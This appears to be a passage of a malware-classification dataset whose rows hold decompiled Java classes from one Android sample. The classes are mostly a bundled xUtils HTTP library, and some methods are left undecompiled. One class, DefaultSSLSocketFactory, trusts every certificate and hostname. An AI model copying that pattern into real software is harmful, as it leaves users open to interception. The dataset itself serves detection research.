MultipartEntity multipartEntity=new MultipartEntity(HttpMultipartMode.STRICT,null,Charset.forName(this.charset));     if (this.bodyParams != null && !this.bodyParams.isEmpty()) {       for (      NameValuePair nameValuePair : this.bodyParams) {         try {           multipartEntity.addPart(nameValuePair.getName(),new StringBody(nameValuePair.getValue()));         }  catch (        UnsupportedEncodingException e) {           LogUtils.e(e.getMessage(),e);         }       }     }     for (    Map.Entry<String,ContentBody> entry : this.fileParams.entrySet()) {       multipartEntity.addPart(entry.getKey(),entry.getValue());     }     return multipartEntity;   }   public List<HeaderItem> getHeaders(){     return this.headers;   }   public Priority getPriority(){     return this.priority;   }   public List<NameValuePair> getQueryStringParams(){     return this.queryStringParams;   }   public void setBodyEntity(  HttpEntity httpEntity){     this.bodyEntity=httpEntity;     if (this.bodyParams != null) {       this.bodyParams.clear();       this.bodyParams=null;     }     if (this.fileParams != null) {       this.fileParams.clear();       this.fileParams=null;     }   }   public void setContentType(  String str){     setHeader(""Content-Type"",str);   }   public void setHeader(  String str,  String str2){     if (this.headers == null) {       this.headers=new ArrayList();     }     this.headers.add(new HeaderItem(str,str2,true));   }   public void setHeader(  Header header){     if (this.headers == null) {       this.headers=new ArrayList();     }     this.headers.add(new HeaderItem(header,true));   }   public void setHeaders(  List<Header> list){     if (this.headers == null) {       this.headers=new ArrayList();     }     Iterator<Header> it=list.iterator();     while (it.hasNext()) {       this.headers.add(new HeaderItem(it.next(),true));     }   }   public void setPriority(  Priority priority){     this.priority=priority;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\ResponseInfo.code","public final class ResponseInfo<T> {   public final Header contentEncoding;   public final long contentLength;   public final Header contentType;   public final Locale locale;   public final ProtocolVersion protocolVersion;   public final String reasonPhrase;   private final HttpResponse response;   public T result;   public final boolean resultFormCache;   public final int statusCode;   public ResponseInfo(  HttpResponse httpResponse,  T t,  boolean z){     this.response=httpResponse;     this.result=t;     this.resultFormCache=z;     if (httpResponse == null) {       this.locale=null;       this.statusCode=0;       this.protocolVersion=null;       this.reasonPhrase=null;       this.contentLength=0L;       this.contentType=null;       this.contentEncoding=null;       return;     }     this.locale=httpResponse.getLocale();     StatusLine statusLine=httpResponse.getStatusLine();     if (statusLine != null) {       this.statusCode=statusLine.getStatusCode();       this.protocolVersion=statusLine.getProtocolVersion();       this.reasonPhrase=statusLine.getReasonPhrase();     }  else {       this.statusCode=0;       this.protocolVersion=null;       this.reasonPhrase=null;     }     HttpEntity entity=httpResponse.getEntity();     if (entity != null) {       this.contentLength=entity.getContentLength();       this.contentType=entity.getContentType();       this.contentEncoding=entity.getContentEncoding();     }  else {       this.contentLength=0L;       this.contentType=null;       this.contentEncoding=null;     }   }   public Header[] getAllHeaders(){     if (this.response == null) {       return null;     }     return this.response.getAllHeaders();   }   public Header getFirstHeader(  String str){     if (this.response == null) {       return null;     }     return this.response.getFirstHeader(str);   }   public Header[] getHeaders(  String str){     if (this.response == null) {       return null;     }     return this.response.getHeaders(str);   }   public Header getLastHeader(  String str){     if (this.response == null) {       return null;     }     return this.response.getLastHeader(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\ResponseStream.code","public class ResponseStream extends InputStream {   private String _directResult;   private HttpResponse baseResponse;   private InputStream baseStream;   private String charset;   private long expiry;   private String requestMethod;   private String requestUrl;   public ResponseStream(  String str){     if (str == null) {       throw new IllegalArgumentException(""result may not be null"");     }     this._directResult=str;   }   public ResponseStream(  HttpResponse httpResponse,  String str,  long j){     this(httpResponse,AsyncHttpResponseHandler.DEFAULT_CHARSET,str,j);   }   public ResponseStream(  HttpResponse httpResponse,  String str,  String str2,  long j){     if (httpResponse == null) {       throw new IllegalArgumentException(""baseResponse may not be null"");     }     this.baseResponse=httpResponse;     this.baseStream=httpResponse.getEntity().getContent();     this.charset=str;     this.requestUrl=str2;     this.expiry=j;   }   @Override public int available(){     if (this.baseStream == null) {       return 0;     }     return this.baseStream.available();   }   @Override public void close(){     if (this.baseStream == null) {       return;     }     this.baseStream.close();   }   public HttpResponse getBaseResponse(){     return this.baseResponse;   }   public InputStream getBaseStream(){     return this.baseStream;   }   public long getContentLength(){     if (this.baseStream == null) {       return 0L;     }     return this.baseResponse.getEntity().getContentLength();   }   public Locale getLocale(){     return this._directResult != null ? Locale.getDefault() : this.baseResponse.getLocale();   }   public String getReasonPhrase(){     return this._directResult != null ? """" : this.baseResponse.getStatusLine().getReasonPhrase();   }   public String getRequestMethod(){     return this.requestMethod;   }   public String getRequestUrl(){     return this.requestUrl;   }   public int getStatusCode(){     if (this._directResult != null) {       return 200;     }     return this.baseResponse.getStatusLine().getStatusCode();   }   @Override public void mark(  int i){     if (this.baseStream == null) {       return;     }     this.baseStream.mark(i);   }   @Override public boolean markSupported(){     if (this.baseStream == null) {       return false;     }     return this.baseStream.markSupported();   }   @Override public int read(){     if (this.baseStream == null) {       return -1;     }     return this.baseStream.read();   }   @Override public int read(  byte[] bArr){     if (this.baseStream == null) {       return -1;     }     return this.baseStream.read(bArr);   }   @Override public int read(  byte[] bArr,  int i,  int i2){     if (this.baseStream == null) {       return -1;     }     return this.baseStream.read(bArr,i,i2);   }   public void readFile(  String str){     BufferedOutputStream bufferedOutputStream;     if (this._directResult != null || this.baseStream == null) {       return;     }     try {       bufferedOutputStream=new BufferedOutputStream(new FileOutputStream(str));     }  catch (    Throwable th) {       th=th;       bufferedOutputStream=null;     }     try {       BufferedInputStream bufferedInputStream=new BufferedInputStream(this.baseStream);       byte[] bArr=new byte[4096];       while (true) {         int read=bufferedInputStream.read(bArr);         if (read == -1) {           bufferedOutputStream.flush();           IOUtils.closeQuietly(bufferedOutputStream);           IOUtils.closeQuietly(this.baseStream);           return;         }         bufferedOutputStream.write(bArr,0,read);       }     }  catch (    Throwable th2) {       th=th2;       IOUtils.closeQuietly(bufferedOutputStream);       IOUtils.closeQuietly(this.baseStream);       throw th;     }   }   public String readString(){     if (this._directResult != null) {       return this._directResult;     }     if (this.baseStream == null) {       return null;     }     try {       BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(this.baseStream,this.charset));       StringBuilder sb=new StringBuilder();       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           break;         }         sb.append(readLine);       }       this._directResult=sb.toString();       if (this.requestUrl != null && HttpUtils.sHttpCache.isEnabled(this.requestMethod)) {         HttpUtils.sHttpCache.put(this.requestUrl,this._directResult,this.expiry);       }       return this._directResult;     }   finally {       IOUtils.closeQuietly(this.baseStream);     }   }   @Override public synchronized void reset(){     if (this.baseStream != null) {       this.baseStream.reset();     }   }   public void setRequestMethod(  String str){     this.requestMethod=str;   }   @Override public long skip(  long j){     if (this.baseStream == null) {       return 0L;     }     return this.baseStream.skip(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\SyncHttpHandler.code","public class SyncHttpHandler {   private String charset;   private final AbstractHttpClient client;   private final HttpContext context;   private HttpRedirectHandler httpRedirectHandler;   private String requestMethod;   private String requestUrl;   private int retriedTimes=0;   private long expiry=HttpCache.getDefaultExpiryTime();   public SyncHttpHandler(  AbstractHttpClient abstractHttpClient,  HttpContext httpContext,  String str){     this.client=abstractHttpClient;     this.context=httpContext;     this.charset=str;   }   private ResponseStream handleResponse(  HttpResponse httpResponse){     if (httpResponse == null) {       throw new HttpException(""response is null"");     }     StatusLine statusLine=httpResponse.getStatusLine();     int statusCode=statusLine.getStatusCode();     if (statusCode < 300) {       ResponseStream responseStream=new ResponseStream(httpResponse,this.charset,this.requestUrl,this.expiry);       responseStream.setRequestMethod(this.requestMethod);       return responseStream;     }     if (statusCode != 301 && statusCode != 302) {       if (statusCode == 416) {         throw new HttpException(statusCode,""maybe the file has downloaded completely"");       }       throw new HttpException(statusCode,statusLine.getReasonPhrase());     }     if (this.httpRedirectHandler == null) {       this.httpRedirectHandler=new DefaultHttpRedirectHandler();     }     HttpRequestBase directRequest=this.httpRedirectHandler.getDirectRequest(httpResponse);     if (directRequest != null) {       return sendRequest(directRequest);     }     return null;   }   public ResponseStream sendRequest(  HttpRequestBase httpRequestBase){     boolean retryRequest;     IOException e;     String str;     HttpRequestRetryHandler httpRequestRetryHandler=this.client.getHttpRequestRetryHandler();     do {       try {         this.requestUrl=httpRequestBase.getURI().toString();         this.requestMethod=httpRequestBase.getMethod();         return (!HttpUtils.sHttpCache.isEnabled(this.requestMethod) || (str=HttpUtils.sHttpCache.get(this.requestUrl)) == null) ? handleResponse(this.client.execute(httpRequestBase,this.context)) : new ResponseStream(str);       }  catch (      HttpException e2) {         throw e2;       } catch (      UnknownHostException e3) {         e=e3;         int i=this.retriedTimes + 1;         this.retriedTimes=i;         retryRequest=httpRequestRetryHandler.retryRequest(e,i,this.context);       } catch (      IOException e4) {         e=e4;         int i2=this.retriedTimes + 1;         this.retriedTimes=i2;         retryRequest=httpRequestRetryHandler.retryRequest(e,i2,this.context);       } catch (      NullPointerException e5) {         IOException iOException=new IOException(e5.getMessage());         iOException.initCause(e5);         int i3=this.retriedTimes + 1;         this.retriedTimes=i3;         retryRequest=httpRequestRetryHandler.retryRequest(iOException,i3,this.context);         e=iOException;       } catch (      Throwable th) {         IOException iOException2=new IOException(th.getMessage());         iOException2.initCause(th);         int i4=this.retriedTimes + 1;         this.retriedTimes=i4;         retryRequest=httpRequestRetryHandler.retryRequest(iOException2,i4,this.context);         e=iOException2;       }     }  while (retryRequest);     throw new HttpException(e);   }   public void setExpiry(  long j){     this.expiry=j;   }   public void setHttpRedirectHandler(  HttpRedirectHandler httpRedirectHandler){     this.httpRedirectHandler=httpRedirectHandler;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.callback\DefaultHttpRedirectHandler.code","public class DefaultHttpRedirectHandler implements HttpRedirectHandler {   @Override public HttpRequestBase getDirectRequest(  HttpResponse httpResponse){     if (!httpResponse.containsHeader(""Location"")) {       return null;     }     HttpGet httpGet=new HttpGet(httpResponse.getFirstHeader(""Location"").getValue());     if (!httpResponse.containsHeader(""Set-Cookie"")) {       return httpGet;     }     httpGet.addHeader(""Cookie"",httpResponse.getFirstHeader(""Set-Cookie"").getValue());     return httpGet;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.callback\FileDownloadHandler.code","public class FileDownloadHandler {   public java.io.File handleEntity(  org.apache.http.HttpEntity r14,  com.fw.tzthree.lidroid.xutils.http.callback.RequestCallBackHandler r15,  java.lang.String r16,  boolean r17,  java.lang.String r18){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.http.callback.FileDownloadHandler.handleEntity(org.apache.http.HttpEntity, com.fw.tzthree.lidroid.xutils.http.callback.RequestCallBackHandler, java.lang.String, boolean, java.lang.String):java.io.File"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.callback\HttpRedirectHandler.code","public interface HttpRedirectHandler {   HttpRequestBase getDirectRequest(  HttpResponse httpResponse); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.callback\RequestCallBack.code","public abstract class RequestCallBack<T> {   private static final int DEFAULT_RATE=1000;   private static final int MIN_RATE=200;   private int rate;   private String requestUrl;   protected Object userTag;   public RequestCallBack(){     this.rate=DEFAULT_RATE;   }   public RequestCallBack(  int i){     this.rate=i;   }   public RequestCallBack(  int i,  Object obj){     this.rate=i;     this.userTag=obj;   }   public RequestCallBack(  Object obj){     this.rate=DEFAULT_RATE;     this.userTag=obj;   }   public final int getRate(){     return this.rate < MIN_RATE ? MIN_RATE : this.rate;   }   public final String getRequestUrl(){     return this.requestUrl;   }   public Object getUserTag(){     return this.userTag;   }   public void onCancelled(){   }   public abstract void onFailure(  HttpException httpException,  String str);   public void onLoading(  long j,  long j2,  boolean z){   }   public void onStart(){   }   public abstract void onSuccess(  ResponseInfo<T> responseInfo);   public final void setRate(  int i){     this.rate=i;   }   public final void setRequestUrl(  String str){     this.requestUrl=str;   }   public void setUserTag(  Object obj){     this.userTag=obj;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.callback\RequestCallBackHandler.code","public interface RequestCallBackHandler {   boolean updateProgress(  long j,  long j2,  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.callback\StringDownloadHandler.code","public class StringDownloadHandler {   public String handleEntity(  HttpEntity httpEntity,  RequestCallBackHandler requestCallBackHandler,  String str){     InputStream inputStream=null;     if (httpEntity == null) {       return null;     }     long j=0;     long contentLength=httpEntity.getContentLength();     if (requestCallBackHandler != null && !requestCallBackHandler.updateProgress(contentLength,0L,true)) {       return null;     }     StringBuilder sb=new StringBuilder();     try {       inputStream=httpEntity.getContent();       BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream,str));       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           break;         }         sb.append(readLine).append('\n');         j+=OtherUtils.sizeOfString(readLine,str);         if (requestCallBackHandler != null && !requestCallBackHandler.updateProgress(contentLength,j,false)) {           break;         }       }       if (requestCallBackHandler != null) {         requestCallBackHandler.updateProgress(contentLength,j,true);       }       IOUtils.closeQuietly(inputStream);       return sb.toString().trim();     }  catch (    Throwable th) {       IOUtils.closeQuietly(inputStream);       throw th;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client\DefaultSSLSocketFactory.code","public class DefaultSSLSocketFactory extends SSLSocketFactory {   private static DefaultSSLSocketFactory instance;   private static KeyStore trustStore;   private SSLContext sslContext; static {     try {       trustStore=KeyStore.getInstance(KeyStore.getDefaultType());       trustStore.load(null,null);     }  catch (    Throwable th) {       LogUtils.e(th.getMessage(),th);     }   }   private DefaultSSLSocketFactory(){     super(trustStore);     this.sslContext=SSLContext.getInstance(""TLS"");     this.sslContext.init(null,new TrustManager[]{new X509TrustManager(){       @Override public void checkClientTrusted(      X509Certificate[] x509CertificateArr,      String str){       }       @Override public void checkServerTrusted(      X509Certificate[] x509CertificateArr,      String str){       }       @Override public X509Certificate[] getAcceptedIssuers(){         return null;       }     } },null);     setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);   }   public static DefaultSSLSocketFactory getSocketFactory(){     if (instance == null) {       try {         instance=new DefaultSSLSocketFactory();       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);       }     }     return instance;   }   @Override public Socket createSocket(){     return this.sslContext.getSocketFactory().createSocket();   }   @Override public Socket createSocket(  Socket socket,  String str,  int i,  boolean z){     return this.sslContext.getSocketFactory().createSocket(socket,str,i,z);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client\HttpRequest.code","public class HttpRequest extends HttpRequestBase implements HttpEntityEnclosingRequest {   private HttpEntity entity;   private HttpMethod method;   private URIBuilder uriBuilder;   private Charset uriCharset;   public enum HttpMethod {  GET(""GET""),   POST(""POST""),   PUT(""PUT""),   HEAD(""HEAD""),   MOVE(""MOVE""),   COPY(""COPY""),   DELETE(""DELETE""),   OPTIONS(""OPTIONS""),   TRACE(""TRACE""),   CONNECT(""CONNECT"");   private final String value;   HttpMethod(  String str){     this.value=str;   }   @Override public String toString(){     return this.value;   } }   public HttpRequest(  HttpMethod httpMethod){     this.method=httpMethod;   }   public HttpRequest(  HttpMethod httpMethod,  String str){     this.method=httpMethod;     setURI(str);   }   public HttpRequest(  HttpMethod httpMethod,  URI uri){     this.method=httpMethod;     setURI(uri);   }   public HttpRequest addQueryStringParameter(  String str,  String str2){     this.uriBuilder.addParameter(str,str2);     return this;   }   public HttpRequest addQueryStringParameter(  NameValuePair nameValuePair){     this.uriBuilder.addParameter(nameValuePair.getName(),nameValuePair.getValue());     return this;   }   public HttpRequest addQueryStringParams(  List<NameValuePair> list){     if (list != null) {       for (      NameValuePair nameValuePair : list) {         this.uriBuilder.addParameter(nameValuePair.getName(),nameValuePair.getValue());       }     }     return this;   }   @Override public Object clone(){     HttpRequest httpRequest=(HttpRequest)super.clone();     if (this.entity != null) {       httpRequest.entity=(HttpEntity)CloneUtils.clone(this.entity);     }     return httpRequest;   }   @Override public boolean expectContinue(){     Header firstHeader=getFirstHeader(""Expect"");     return firstHeader != null && ""100-continue"".equalsIgnoreCase(firstHeader.getValue());   }   @Override public HttpEntity getEntity(){     return this.entity;   }   @Override public String getMethod(){     return this.method.toString();   }   @Override public URI getURI(){     try {       if (this.uriCharset == null) {         this.uriCharset=OtherUtils.getCharsetFromHttpRequest(this);       }       if (this.uriCharset == null) {         this.uriCharset=Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET);       }       return this.uriBuilder.build(this.uriCharset);     }  catch (    URISyntaxException e) {       LogUtils.e(e.getMessage(),e);       return null;     }   }   @Override public void setEntity(  HttpEntity httpEntity){     this.entity=httpEntity;   }   public void setRequestParams(  RequestParams requestParams){     if (requestParams != null) {       if (this.uriCharset == null) {         this.uriCharset=Charset.forName(requestParams.getCharset());       }       List<RequestParams.HeaderItem> headers=requestParams.getHeaders();       if (headers != null) {         for (        RequestParams.HeaderItem headerItem : headers) {           if (headerItem.overwrite) {             setHeader(headerItem.header);           }  else {             addHeader(headerItem.header);           }         }       }       addQueryStringParams(requestParams.getQueryStringParams());       setEntity(requestParams.getEntity());     }   }   public void setRequestParams(  RequestParams requestParams,  RequestCallBackHandler requestCallBackHandler){     if (requestParams != null) {       if (this.uriCharset == null) {         this.uriCharset=Charset.forName(requestParams.getCharset());       }       List<RequestParams.HeaderItem> headers=requestParams.getHeaders();       if (headers != null) {         for (        RequestParams.HeaderItem headerItem : headers) {           if (headerItem.overwrite) {             setHeader(headerItem.header);           }  else {             addHeader(headerItem.header);           }         }       }       addQueryStringParams(requestParams.getQueryStringParams());       HttpEntity entity=requestParams.getEntity();       if (entity != null) {         if (entity instanceof UploadEntity) {           ((UploadEntity)entity).setCallBackHandler(requestCallBackHandler);         }         setEntity(entity);       }     }   }   public void setURI(  String str){     this.uriBuilder=new URIBuilder(str);   }   @Override public void setURI(  URI uri){     this.uriBuilder=new URIBuilder(uri);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client\RetryHandler.code","public class RetryHandler implements HttpRequestRetryHandler {   private static final int RETRY_SLEEP_INTERVAL=500;   private final int maxRetries;   private static HashSet<Class<?>> exceptionWhiteList=new HashSet<>();   private static HashSet<Class<?>> exceptionBlackList=new HashSet<>(); static {     exceptionWhiteList.add(NoHttpResponseException.class);     exceptionWhiteList.add(UnknownHostException.class);     exceptionWhiteList.add(SocketException.class);     exceptionBlackList.add(InterruptedIOException.class);     exceptionBlackList.add(SSLHandshakeException.class);   }   public RetryHandler(  int i){     this.maxRetries=i;   }   @Override public boolean retryRequest(  java.io.IOException r6,  int r7,  org.apache.http.protocol.HttpContext r8){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.http.client.RetryHandler.retryRequest(java.io.IOException, int, org.apache.http.protocol.HttpContext):boolean"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.entity\BodyParamsEntity.code","public class BodyParamsEntity extends AbstractHttpEntity implements Cloneable {   private String charset;   protected byte[] content;   private boolean dirty;   private List<NameValuePair> params;   public BodyParamsEntity(){     this((String)null);   }   public BodyParamsEntity(  String str){     this.dirty=true;     this.charset=AsyncHttpResponseHandler.DEFAULT_CHARSET;     if (str != null) {       this.charset=str;     }     setContentType(URLEncodedUtils.CONTENT_TYPE);     this.params=new ArrayList();   }   public BodyParamsEntity(  List<NameValuePair> list){     this(list,null);   }   public BodyParamsEntity(  List<NameValuePair> list,  String str){     this.dirty=true;     this.charset=AsyncHttpResponseHandler.DEFAULT_CHARSET;     if (str != null) {       this.charset=str;     }     setContentType(URLEncodedUtils.CONTENT_TYPE);     this.params=list;     refreshContent();   }   private void refreshContent(){     if (this.dirty) {       try {         this.content=URLEncodedUtils.format(this.params,this.charset).getBytes(this.charset);       }  catch (      UnsupportedEncodingException e) {         LogUtils.e(e.getMessage(),e);       }       this.dirty=false;     }   }   public BodyParamsEntity addParameter(  String str,  String str2){     this.params.add(new BasicNameValuePair(str,str2));     this.dirty=true;     return this;   }   public BodyParamsEntity addParams(  List<NameValuePair> list){     this.params.addAll(list);     this.dirty=true;     return this;   }   public Object clone(){     return super.clone();   }   @Override public InputStream getContent(){     refreshContent();     return new ByteArrayInputStream(this.content);   }   @Override public long getContentLength(){     refreshContent();     return this.content.length;   }   @Override public boolean isRepeatable(){     return true;   }   @Override public boolean isStreaming(){     return false;   }   @Override public void writeTo(  OutputStream outputStream){     if (outputStream == null) {       throw new IllegalArgumentException(""Output stream may not be null"");     }     refreshContent();     outputStream.write(this.content);     outputStream.flush();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.entity\DecompressingEntity.code","abstract class DecompressingEntity extends HttpEntityWrapper implements UploadEntity {   private RequestCallBackHandler callBackHandler;   private InputStream content;   private long uncompressedLength;   private long uploadedSize;   public DecompressingEntity(  HttpEntity httpEntity){     super(httpEntity);     this.uploadedSize=0L;     this.callBackHandler=null;     this.uncompressedLength=httpEntity.getContentLength();   }   private InputStream getDecompressingStream(){     InputStream inputStream=null;     try {       inputStream=this.wrappedEntity.getContent();       return decorate(inputStream);     }  catch (    IOException e) {       IOUtils.closeQuietly(inputStream);       throw e;     }   }   abstract InputStream decorate(  InputStream inputStream);   @Override public InputStream getContent(){     if (!this.wrappedEntity.isStreaming()) {       return getDecompressingStream();     }     if (this.content == null) {       this.content=getDecompressingStream();     }     return this.content;   }   @Override public long getContentLength(){     return -1L;   }   @Override public void setCallBackHandler(  RequestCallBackHandler requestCallBackHandler){     this.callBackHandler=requestCallBackHandler;   }   @Override public void writeTo(  OutputStream outputStream){     InputStream content;     if (outputStream == null) {       throw new IllegalArgumentException(""Output stream may not be null"");     }     InputStream inputStream=null;     try {       content=getContent();     }  catch (    Throwable th) {       th=th;     }     try {       byte[] bArr=new byte[4096];       while (true) {         int read=content.read(bArr);         if (read == -1) {           outputStream.flush();           if (this.callBackHandler != null) {             this.callBackHandler.updateProgress(this.uncompressedLength,this.uploadedSize,true);           }           IOUtils.closeQuietly(content);           return;         }         outputStream.write(bArr,0,read);         this.uploadedSize+=read;         if (this.callBackHandler != null && !this.callBackHandler.updateProgress(this.uncompressedLength,this.uploadedSize,false)) {           throw new InterruptedIOException(""cancel"");         }       }     }  catch (    Throwable th2) {       th=th2;       inputStream=content;       IOUtils.closeQuietly(inputStream);       throw th;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.entity\FileUploadEntity.code","public class FileUploadEntity extends FileEntity implements UploadEntity {   private RequestCallBackHandler callBackHandler;   private long fileSize;   private long uploadedSize;   public FileUploadEntity(  File file,  String str){     super(file,str);     this.uploadedSize=0L;     this.callBackHandler=null;     this.fileSize=file.length();   }   @Override public void setCallBackHandler(  RequestCallBackHandler requestCallBackHandler){     this.callBackHandler=requestCallBackHandler;   }   @Override public void writeTo(  OutputStream outputStream){     BufferedInputStream bufferedInputStream;     if (outputStream == null) {       throw new IllegalArgumentException(""Output stream may not be null"");     }     BufferedInputStream bufferedInputStream2=null;     try {       bufferedInputStream=new BufferedInputStream(new FileInputStream(this.file));     }  catch (    Throwable th) {       th=th;     }     try {       byte[] bArr=new byte[4096];       while (true) {         int read=bufferedInputStream.read(bArr);         if (read == -1) {           outputStream.flush();           if (this.callBackHandler != null) {             this.callBackHandler.updateProgress(this.fileSize,this.uploadedSize,true);           }           IOUtils.closeQuietly(bufferedInputStream);           return;         }         outputStream.write(bArr,0,read);         this.uploadedSize+=read;         if (this.callBackHandler != null && !this.callBackHandler.updateProgress(this.fileSize,this.uploadedSize,false)) {           throw new InterruptedIOException(""cancel"");         }       }     }  catch (    Throwable th2) {       th=th2;       bufferedInputStream2=bufferedInputStream;       IOUtils.closeQuietly(bufferedInputStream2);       throw th;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.entity\GZipDecompressingEntity.code","public class GZipDecompressingEntity extends DecompressingEntity {   public GZipDecompressingEntity(  HttpEntity httpEntity){     super(httpEntity);   }   @Override InputStream decorate(  InputStream inputStream){     return new GZIPInputStream(inputStream);   }   @Override public InputStream getContent(){     return super.getContent();   }   @Override public Header getContentEncoding(){     return null;   }   @Override public long getContentLength(){     return super.getContentLength();   }   @Override public void setCallBackHandler(  RequestCallBackHandler requestCallBackHandler){     super.setCallBackHandler(requestCallBackHandler);   }   @Override public void writeTo(  OutputStream outputStream){     super.writeTo(outputStream);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.entity\InputStreamUploadEntity.code","public class InputStreamUploadEntity extends AbstractHttpEntity implements UploadEntity {   private static final int BUFFER_SIZE=2048;   private final InputStream content;   private final long length;   private long uploadedSize=0;   private RequestCallBackHandler callBackHandler=null;   public InputStreamUploadEntity(  InputStream inputStream,  long j){     if (inputStream == null) {       throw new IllegalArgumentException(""Source input stream may not be null"");     }     this.content=inputStream;     this.length=j;   }   @Override public void consumeContent(){     this.content.close();   }   @Override public InputStream getContent(){     return this.content;   }   @Override public long getContentLength(){     return this.length;   }   @Override public boolean isRepeatable(){     return false;   }   @Override public boolean isStreaming(){     return true;   }   @Override public void setCallBackHandler(  RequestCallBackHandler requestCallBackHandler){     this.callBackHandler=requestCallBackHandler;   }   @Override public void writeTo(  OutputStream outputStream){     int read;     if (outputStream == null) {       throw new IllegalArgumentException(""Output stream may not be null"");     }     InputStream inputStream=this.content;     try {       byte[] bArr=new byte[2048];       if (this.length < 0) {         while (true) {           int read2=inputStream.read(bArr);           if (read2 == -1) {             break;           }           outputStream.write(bArr,0,read2);           this.uploadedSize+=read2;           if (this.callBackHandler != null && !this.callBackHandler.updateProgress(this.uploadedSize + 1,this.uploadedSize,false)) {             throw new InterruptedIOException(""cancel"");           }         }       }  else {         long j=this.length;         while (j > 0 && (read=inputStream.read(bArr,0,(int)Math.min(2048L,j))) != -1) {           outputStream.write(bArr,0,read);           long j2=j - read;           this.uploadedSize+=read;           if (this.callBackHandler != null && !this.callBackHandler.updateProgress(this.length,this.uploadedSize,false)) {             throw new InterruptedIOException(""cancel"");           }           j=j2;         }       }       outputStream.flush();       if (this.callBackHandler != null) {         this.callBackHandler.updateProgress(this.length,this.uploadedSize,true);       }     }   finally {       IOUtils.closeQuietly(inputStream);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.entity\UploadEntity.code","public interface UploadEntity {   void setCallBackHandler(  RequestCallBackHandler requestCallBackHandler); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart\CallBackInfo.code","public class CallBackInfo {   public static final CallBackInfo DEFAULT=new CallBackInfo();   public RequestCallBackHandler callBackHandler=null;   public long totalLength=0;   public long pos=0;   public boolean doCallBack(  boolean z){     if (this.callBackHandler != null) {       return this.callBackHandler.updateProgress(this.totalLength,this.pos,z);     }     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart\FormBodyPart.code","public class FormBodyPart {   private final ContentBody body;   private final MinimalFieldHeader header;   private final String name;   public FormBodyPart(  String str,  ContentBody contentBody){     if (str == null) {       throw new IllegalArgumentException(""Name may not be null"");     }     if (contentBody == null) {       throw new IllegalArgumentException(""Body may not be null"");     }     this.name=str;     this.body=contentBody;     this.header=new MinimalFieldHeader();     generateContentDisposition(contentBody);     generateContentType(contentBody);     generateTransferEncoding(contentBody);   }   public FormBodyPart(  String str,  ContentBody contentBody,  String str2){     if (str == null) {       throw new IllegalArgumentException(""Name may not be null"");     }     if (contentBody == null) {       throw new IllegalArgumentException(""Body may not be null"");     }     this.name=str;     this.body=contentBody;     this.header=new MinimalFieldHeader();     if (str2 != null) {       addField(""Content-Disposition"",str2);     }  else {       generateContentDisposition(contentBody);     }     